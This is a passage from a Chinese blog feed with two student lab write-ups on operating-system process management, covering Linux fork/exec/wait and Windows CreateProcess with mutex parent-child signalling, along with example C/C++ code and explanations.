        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！</p><h3 id="实验二-Linux-进程-管理"><a href="#实验二-Linux-进程-管理" class="headerlink" title="实验二  Linux 进程 管理"></a>实验二  Linux 进程 管理</h3><ol><li><p>实验目的<br>通过进程的创建、撤销和运行加深对进程概念和进程并发执行的理解，明确进程和程序之间的区别。</p></li><li><p>实验内容和步骤</p><p>（1）进程的创建：</p><p>这里要玩虚拟机了，在虚拟机上玩Centos，也就是基于Linux开发的操作系统。安装什么的就不赘述了，网上都可以找得到对应的教程。如下是安装好之后的界面！</p><p><img src="/images/OS/image-20210622081002064.png" alt="image-20210622081002064"></p><p>肉眼可见的是，Linux操作系统的界面同Windows有很多相似之处。但是捏，我还不太会用Linux，所以下面来简单的介绍一下Linux操作系统的使用吧！</p><ul><li><p>Linux编程基础</p><ol><li><p>熟悉Linux下的c/c++编程环境：vi/gedit编辑器+gcc编译器+gdb调试器</p><p>怎么玩捏？</p><ul><li>vi编辑器是所有Unix及Linux系统下标准的编辑器，它的强大不逊色于任何最新的文本<br>编辑器，这里只是简单地介绍一下它的用法和一小部分指令。由于对Unix及Linux系统的任<br>何版本，vi编辑器是完全相同的，因此您可以在其他任何介绍vi的地方进一步了解它。Vi<br>也是Linux中最基本的文本编辑器，学会它后，您将在Linux的世界里畅行无阻。</li></ul><p>请看教程：<a href="https://www.runoob.com/linux/linux-vim.html">vi/vim的使用</a> <a href="https://www.doc88.com/p-43941787254.html">Linux下的C编程</a> <a href="https://www.bilibili.com/video/BV1yp4y1X7uT?from=search&seid=14386135202382341130">vim编辑器的使用</a></p></li><li><p>在Linux下新建一个文件夹，命名为hnust_OS。在目录下打开shell。</p><p><img src="/images/OS/image-20210622083848516.png" alt="新建hnust_OS文件夹"></p><p>创建了hnust_OS文件夹。</p><p>敲入命令vim fuckcode.c 就成功的在目录下创建了.c文件。按i,进入编辑模式。代码可以右键复制粘贴过去。然后捏，就可以按ESC退出，再按:进入底线模式，然后输入w保存，q退出。也可直接wq保存并退出！</p><p><img src="/images/OS/image-20210622084726235.png" alt="底线模式">        </p><p>一顿操作猛如虎，我们的fuckcode.c便成功了，可以看到下面有了fuckcode.c的文件！</p><p><img src="/images/OS/image-20210622085239971.png" alt="文件创建成功"></p><p>这个时候我们要编译fuckcode了！请看操作！</p><ul><li>由于 c 语言是一种高级语言，所以输入完 c 程序后就要对它进行编译。gcc 命令可以用来编译<br>c 程序。如果在 gcc 命令后面直接跟上文件名，则编译后的输出结果将存放在标准的 a.out 文件中。<br>如果 gcc 命令使用-o 任选项，则可以将编译结果存放在自己命名的文件中。为方便起见，我们使<br>用带-o 任选项的 gcc 命令来进行编译。当然，在本次课程设计中也可以使用 gcc 命令进行编译。<br>$gcc –o compact compact.c</li></ul><p><img src="/images/OS/image-20210622085527806.png" alt="编译成功"></p><p>可以看到！编译成功！！</p><p>接下来我们./fuckcode来运行。</p><p><img src="/images/OS/image-20210622090810151.png" alt="效果"></p><p>对了，这里要特别声明一下！指导书里写的删除空行的程序试错的！他妈的！把’/n’改成’ ‘，就能实现如上图所示的功能了！</p></li><li><p>恭喜，你差不多玩明白了基础操作。下面让我们开始搞课设吧！！！</p></li></ol></li></ul><p>先看一下任务要求:</p><p>编写一段程序，使用系统调用 fork（）创建一个子进程。当此程序运行时，在系统中有一个父进程和一个子进程活动。让每一个进程在屏幕上分别显示字符：父进程显示字符“b”；子进程显示字符“a”，另外父子进程都显示字符“c”。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br>main()<br>&#123;<br><span class="hljs-keyword">int</span> x;<br>srand((<span class="hljs-keyword">unsigned</span>)time(<span class="hljs-literal">NULL</span>));<br><span class="hljs-keyword">while</span>((x=fork())==<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>)<br>&#123;<br>sleep(rand() % <span class="hljs-number">2</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>sleep(rand() % <span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到效果如下：</p><p><img src="/images/OS/image-20210622093219176.png" alt="image-20210622093219176"></p><p>分析：fork 建立一个子进程，父进程继续运行，子进程在同样的位置执行同样的程序。对于父进程，<br>fork()返回子进程的 pid, 对于子进程，fork()返回 0。出错时返回-1。两个进程同时运行！至于谁先上，这个是哲学问题…</p><p>（2）子进程执行新任务</p><p>任务要求：</p><p>编写一段程序，使用系统调用 fork（）创建一个子进程。子进程通过系统调用 exec更换自己原有的执行代码，转去执行 Linux 命令/bin/ls (显示当前目录的列表)，然后调用 exit（）函数结束。父进程则调用 waitpid()等待子进程结束，并在子进程结束后显示子进程的标识符，然后正常结束。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">pid_t</span> pid;<br><span class="hljs-comment">/* fork a child process */</span><br>pid = fork();<br><span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">/* error occurred */</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fork Failed&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">/* 子进程 */</span><br>execlp(<span class="hljs-string">&quot;/bin/ls&quot;</span>,<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 父进程 */</span><br><span class="hljs-comment">/* 父进程将一直等待，直到子进程运行完毕*/</span><br>wait(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Child Complete&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/images/OS/image-20210622094638778.png" alt="image-20210622094638778"></p><p>注意！从指导书复制代码过来的时候，要给头文件加上#include &lt;sys/wait.h&gt;。否则程序无法正常运行哦！</p><p>分析：</p><ul><li>exec 系列函数用新的进程映象置换当前的进程映象.这些函数的第一个参数是待执行程序的路<br>径名(文件名)。这些函数调用成功后不会返回,其进程的正文(text),数据(data)和栈(stack)段被待执行<br>程序程序覆盖。但是进程的 PID 和所有打开的文件描述符没有改变,同时悬挂信号被清除，信号重<br>置为缺省行为。</li><li>使用系统调用 fork（）创建一个子进程。子进程通过系统调用 exec更换自己原有的执行代码，转去执行 Linux 命令/bin/ls (显示当前目录的列表)，然后调用 exit（）函数结束。父进程则调用 waitpid()等待子进程结束，并在子进程结束后显示子进程的标识符，然后正常结束。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课程设计(一)-Windows进程管理</title>
      <link href="/2021/06/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%B8%80/"/>
      <url>/2021/06/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又到了 一年一度期末课设的时候，距离考试还有两周的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周一，胡小宁就要开始做课设了！</p><h3 id="实验一-Windows-进程管理"><a href="#实验一-Windows-进程管理" class="headerlink" title="实验一 Windows 进程管理"></a>实验一 Windows 进程管理</h3><ol><li><p>实验目的<br>（1）学会使用 VC 编写基本的 Win32 Consol Application（控制台应用程序)。<br>（2）通过创建进程、观察正在运行的进程和终止进程的程序设计和调试操作，进一步熟悉操<br>作系统的进程概念，理解 Windows 进程的“一生”。<br>（3）通过阅读和分析实验程序，学习创建进程、观察进程、终止进程以及父子进程同步的基<br>本程序设计方法。</p></li><li><p>实验内容和步骤</p><p>（1） 编写基本的 Win32 Consol Application：</p><p>指导书上的步骤有很多缺陷。我在Windows上做课设所使用的编译器是CodeBlocks，所以在操作和代码方面与指导书给的标准有些出入。这里创建的是Consol Application。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello, Win32 Consol Application&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就完成了编写基本的Consol Application。</p><p>分析：按照指导书的操作运行会不成功，原因有二。一是编译器的不同，CodeBlocks不允许主函数无返回类型。二是从指导书上直接复制过来的代码有许多非法字符，非法空格，这些都需要更改。</p><p>（2）创建进程</p></li></ol><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">// 创建传递过来的进程的克隆过程并赋于其 ID 值</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StartClone</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nCloneID)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 提取用于当前可执行文件的文件名</span><br>TCHAR szFilename[MAX_PATH] ;<br>GetModuleFileName(<span class="hljs-literal">NULL</span>, szFilename, MAX_PATH) ;<br><span class="hljs-comment">// 格式化用于子进程的命令行并通知其 EXE 文件名和克隆 ID</span><br>TCHAR szCmdLine[MAX_PATH];<br><span class="hljs-built_in">sprintf</span>(szCmdLine,<span class="hljs-string">&quot;\&quot;%s\&quot; %d&quot;</span>,szFilename,nCloneID);<br><span class="hljs-comment">// 用于子进程的 STARTUPINFO 结构</span><br>STARTUPINFO si;<br>ZeroMemory(&amp;si , <span class="hljs-keyword">sizeof</span>(si) ) ;<br>si.cb = <span class="hljs-keyword">sizeof</span>(si) ; <span class="hljs-comment">// 必须是本结构的大小</span><br><span class="hljs-comment">// 返回的用于子进程的进程信息</span><br>PROCESS_INFORMATION pi;<br><span class="hljs-comment">// 利用同样的可执行文件和命令行创建进程，并赋于其子进程的性质</span><br>BOOL bCreateOK=::CreateProcess(<br>szFilename, <span class="hljs-comment">// 产生这个 EXE 的应用程序的名称</span><br>szCmdLine, <span class="hljs-comment">// 告诉其行为像一个子进程的标志</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 缺省的进程安全性</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 缺省的线程安全性</span><br>FALSE, <span class="hljs-comment">// 不继承句柄</span><br>CREATE_NEW_CONSOLE, <span class="hljs-comment">// 使用新的控制台</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 新的环境</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 当前目录</span><br>&amp;si, <span class="hljs-comment">// 启动信息</span><br>&amp;pi) ; <span class="hljs-comment">// 返回的进程信息</span><br><span class="hljs-comment">// 对子进程释放引用</span><br><span class="hljs-keyword">if</span> (bCreateOK)<br>&#123;<br>CloseHandle(pi.hProcess) ;<br>CloseHandle(pi.hThread) ;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[] )</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 确定派生出几个进程，及派生进程在进程列表中的位置</span><br><span class="hljs-keyword">int</span> nClone=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//修改语句：int nClone;</span><br><span class="hljs-comment">//第一次修改：nClone=0;</span><br><span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">// 从第二个参数中提取克隆 ID</span><br>:: <span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>] , <span class="hljs-string">&quot;%d&quot;</span> , &amp;nClone) ;<br>&#125;<br><span class="hljs-comment">//第二次修改：nClone=0;</span><br><span class="hljs-comment">// 显示进程位置</span><br><span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Process ID:&quot;</span> &lt;&lt; :: GetCurrentProcessId()<br>&lt;&lt; <span class="hljs-string">&quot;, Clone ID:&quot;</span> &lt;&lt; nClone<br>&lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">// 检查是否有创建子进程的需要</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> c_nCloneMax=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (nClone &lt; c_nCloneMax)<br>&#123;<br><span class="hljs-comment">// 发送新进程的命令行和克隆号</span><br>StartClone(++nClone) ;<br>&#125;<br><span class="hljs-comment">// 等待响应键盘输入结束进程</span><br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/images/OS/image-20210621161818916.png" alt="image-20210621161818916"></p><p>修改nClone=1；</p><p>运行结果如下：</p><p><img src="/images/OS/image-20210621161940179.png" alt="image-20210621161940179"></p><p>修改nClone=2；</p><p>运行结果如下：</p><p><img src="/images/OS/image-20210621162033540.png" alt="image-20210621162033540"></p><p>如上是nClone取值不同所产生的不同运行结果。可以看出，进程ID起始值同nClone的值相同。如果将nClone的初始化位置换在下方，将会有非常严重的后果产生—进程创建的死循环！不一会儿你的电脑内存就炸了！！！</p><p>分析：程序从main函数开始，创建进程，每次引用该进程exe文件位置创建下一个进程（再反过来继续调用main函数，如此循环，使用c_nCloneMax作为限制）。因为调换了nClone的初始化位置，会使nClone永远达不到c_nCloneMax，造成死循环。</p><p>（3）父子进程的简单通信及终止进程</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// procterm 项目</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">static</span> LPCTSTR g_szMutexName = <span class="hljs-string">&quot;w2kdg.ProcTerm.mutex.Suicide&quot;</span> ;<br><span class="hljs-comment">// 创建当前进程的克隆进程的简单方法</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StartClone</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 提取当前可执行文件的文件名</span><br>TCHAR szFilename[MAX_PATH] ;<br>GetModuleFileName(<span class="hljs-literal">NULL</span>, szFilename, MAX_PATH) ;<br><span class="hljs-comment">// 格式化用于子进程的命令行，字符串“child”将作为形参传递给子进程的 main 函数</span><br>TCHAR szCmdLine[MAX_PATH] ;<br><span class="hljs-comment">//实验 1-3 步骤 3：将下句中的字符串 child 改为别的字符串，重新编译执行，执行前请先保存已经完成的工作</span><br><span class="hljs-built_in">sprintf</span>(szCmdLine, <span class="hljs-string">&quot;\&quot;%s\&quot; child&quot;</span>, szFilename) ;<br><span class="hljs-comment">// 子进程的启动信息结构</span><br>STARTUPINFO si;<br>ZeroMemory(&amp;si,<span class="hljs-keyword">sizeof</span>(si)) ;<br>si.cb = <span class="hljs-keyword">sizeof</span>(si) ; <span class="hljs-comment">// 应当是此结构的大小</span><br><span class="hljs-comment">// 返回的用于子进程的进程信息</span><br>PROCESS_INFORMATION pi;<br><span class="hljs-comment">// 用同样的可执行文件名和命令行创建进程，并指明它是一个子进程</span><br>BOOL bCreateOK=CreateProcess(<br>szFilename, <span class="hljs-comment">// 产生的应用程序的名称 (本 EXE 文件)</span><br>szCmdLine, <span class="hljs-comment">// 告诉我们这是一个子进程的标志</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 用于进程的缺省的安全性</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 用于线程的缺省安全性</span><br>FALSE, <span class="hljs-comment">// 不继承句柄</span><br>CREATE_NEW_CONSOLE, <span class="hljs-comment">//创建新窗口</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 新环境</span><br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 当前目录</span><br>&amp;si, <span class="hljs-comment">// 启动信息结构</span><br>&amp;pi ) ; <span class="hljs-comment">// 返回的进程信息</span><br><span class="hljs-comment">// 释放指向子进程的引用</span><br><span class="hljs-keyword">if</span> (bCreateOK)<br>&#123;<br>CloseHandle(pi.hProcess) ;<br>CloseHandle(pi.hThread) ;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Parent</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 创建“自杀”互斥程序体</span><br>HANDLE hMutexSuicide=CreateMutex(<br><span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 缺省的安全性</span><br>TRUE, <span class="hljs-comment">// 最初拥有的</span><br>g_szMutexName) ; <span class="hljs-comment">// 互斥体名称</span><br><span class="hljs-keyword">if</span> (hMutexSuicide != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">// 创建子进程</span><br><span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Creating the child process.&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br>StartClone() ;<br><span class="hljs-comment">// 指令子进程“杀”掉自身</span><br><span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Telling the child process to quit. &quot;</span>&lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//等待父进程的键盘响应</span><br>getchar() ;<br><span class="hljs-comment">//释放互斥体的所有权，这个信号会发送给子进程的 WaitForSingleObject 过程</span><br>ReleaseMutex(hMutexSuicide) ;<br><span class="hljs-comment">// 消除句柄</span><br>CloseHandle(hMutexSuicide) ;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Child</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 打开“自杀”互斥体</span><br>HANDLE hMutexSuicide = OpenMutex(<br>SYNCHRONIZE, <span class="hljs-comment">// 打开用于同步</span><br>FALSE, <span class="hljs-comment">// 不需要向下传递</span><br>g_szMutexName) ; <span class="hljs-comment">// 名称</span><br><span class="hljs-keyword">if</span> (hMutexSuicide != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">// 报告我们正在等待指令</span><br><span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt;<span class="hljs-string">&quot;Child waiting for suicide instructions. &quot;</span> &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//子进程进入阻塞状态，等待父进程通过互斥体发来的信号</span><br>WaitForSingleObject(hMutexSuicide, INFINITE) ;<br><span class="hljs-comment">//实验 1-3 步骤 4：将上句改为 WaitForSingleObject(hMutexSuicide, 0) ，重新编译执行</span><br><span class="hljs-comment">// 准备好终止，清除句柄</span><br><span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Child quiting.&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br>CloseHandle(hMutexSuicide) ;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[] )</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 决定其行为是父进程还是子进程</span><br><span class="hljs-keyword">if</span> (argc&gt;<span class="hljs-number">1</span> &amp;&amp; :: <span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>] , <span class="hljs-string">&quot;child&quot;</span> )== <span class="hljs-number">0</span>)<br>&#123;<br>Child() ;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>Parent() ;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在利用CreateProcess函数创建进程时，命令行中需要szCmdLine来作为argv的参数创建这个子进程，两个参数是分开的， sprintf()函数中的”\”%s\” child”，%s填入的是可执行文件的路径，child则是创建子进程。两个参数之间必须加上空格才正确。如果只是抄过来指导书上的代码，将会进入死循环。内存炸了哦！</p><p>步骤3：第一次修改后，创建进程的第二个参数不是child了，因此子进程进入的是parent函数，所以程序在不断的创建子进程，死循环。</p><p>步骤4：第二次修改后，WaitForSingleObject(hMutexSuicide, INFINITE);INFINITE变成了0，所以会进入临界区，继续执行子进程，最后关闭子进程并关闭句柄。</p><p>整个程序要体现的是父子进程通信，父子进程的同步是由PV操作完成的。</p><p>P操作：WaitForSingleObject(hMutexSuicide, INFINITE);<br>V操作：ReleaseMutex(hMutexSuicide)</p><p>HANDLE hMutexSuicide = CreateMutex(NULL,TRUE,g_szMutexName);<br>互斥体实现了“互相排斥”（mutual exclusion）同步的简单形式（所以名为互斥体(mutex)）。<br>互斥体禁止多个线程同时进入受保护的代码“临界区”（critical section）。<br>因此，在任意时刻，只有一个线程被允许进入这样的代码保护区。任何线程在进入临界区之前，<br>必须获取（acquire）与此区域相关联的互斥体的所有权。如果已有另一线程拥有了临界区的互斥体，其他线程就不能再进入其中。这些线程必须等待，直到当前的属主线程释放（release）该互斥体。</p><p>ReleaseMutex(hMutexSuicide);<br>一个线程释放了互斥对象的控制权后，如果其他进程在等待互斥对象置位，则等待的线程可以得到该互斥对象，等待函数返回，互斥对象被新的线程所拥有。并且会发送信号给waitforsingleobject</p><p>WaitForSingleObject(hMutexSuicide, 